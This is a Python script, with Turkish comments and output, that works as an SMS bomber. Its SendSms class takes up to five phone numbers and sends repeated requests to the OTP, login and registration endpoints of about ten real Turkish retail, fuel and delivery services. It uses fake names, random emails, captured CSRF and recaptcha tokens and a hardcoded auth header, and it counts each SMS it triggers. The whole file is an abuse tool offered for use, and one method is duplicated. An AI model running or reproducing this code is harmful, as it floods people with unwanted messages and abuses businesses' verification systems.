import requests

from random import choice

from string import ascii_lowercase

from bs4 import BeautifulSoup

from colorama import Fore, Style

from time import sleep



class SendSms():

    adet = 0

    toplam_sms = 1

    

   

    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):

        self.phone = str(phone)

        self.phone2 = str(phone2)

        self.phone3 = str(phone3)

        self.phone4 = str(phone4)

        self.phone5 = str(phone5)

        if len(mail) != 0:

            self.mail = mail

        else:

            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"

            

    

    





    # dsmartgo.com.tr

    def Dsmartgo(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={

        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",

        	        "IsSubscriber": "true",

        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",

        	        "Mobile": numara,

                }, cookies={

        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		    "_ga": "GA1.3.1016548678.1638216163",

        		    "_gat": "1",

        		    "_gat_gtag_UA_18913632_14": "1",

        		    "_gid": "GA1.3.1214889554.1638216163",

        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"

        	    })

            try:

                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()

                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")

            except AttributeError:

                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                self.adet += 1

                self.toplam_sms += 1

            uygulanan_nolar += 1

            if uygulanan_nolar == bos_olmayan:

                break

            else:

                continue

        




    #kahvedunyasi.com

    def KahveDunyasi(self):    

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                    "mobile_number": numara,

                    "token_type": "register_token"

                })

                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise 

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

        



    
          
   


    #bim

    def Bim(self):         

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})

                    if bim.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

        


    #a101.com.tr

    def A101(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.a101.com.tr:443/users/otp-login/"

                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}

                    r = requests.post(url,data=data)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    #englishhome.com

    def Englishhome(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}

                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)

                    if home.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            


    

    

            

    

    

            

    


    #KimGbIster

    def KimGb(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue





    

            

            


    #ipragaz.com.tr

    def IpraGaz(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"

                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}

                    r = requests.post(url, json=json)

                    if (r.json()["phoneNumber"]) == str(numara):

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

             

    #mogazmobilapinew.aygaz.com.tr

    def Mogaz(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"

                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}

                    r = requests.post(url, json=json)

                    if (r.json()["messageCode"]) == "OK":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue  

            


    

            

    



    #tazi.tech

    def Tazi(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"

                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}

                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.json()["kod"]) == "0000":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    

            

    



    #gofody.com

    def Gofody(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"

                    json={"country_code": "90", "phone": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["success"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue





    

            

            


    

    #evidea.com

    def Evidea(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.evidea.com:443/users/register/"

                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}

                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"

                    r = requests.post(url, headers=headers, data=data)      

                    if r.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

 

    #evidea.com

    def Evidea(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.evidea.com:443/users/register/"

                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}

                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"

                    r = requests.post(url, headers=headers, data=data)      

                    if r.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

 
